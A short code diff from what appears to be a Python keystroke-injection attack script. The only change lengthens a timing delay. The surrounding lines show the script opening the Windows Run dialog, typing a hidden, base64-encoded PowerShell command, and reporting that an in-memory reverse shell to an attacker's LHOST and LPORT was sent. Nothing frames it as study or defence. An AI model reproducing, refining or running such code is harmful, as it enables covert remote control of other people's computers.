@@ -29,7 +29,7 @@ def main():
     print("[*] LHOST =", lhost, "LPORT =", lport)
     win_r(); time.sleep(0.5)
     type_string("powershell\n")
-    time.sleep(0.8)
+    time.sleep(1.0)
     type_string(f"powershell -nop -w hidden -enc {b64}\n")
     print("[*] Sent in-memory reverse shell.")
 
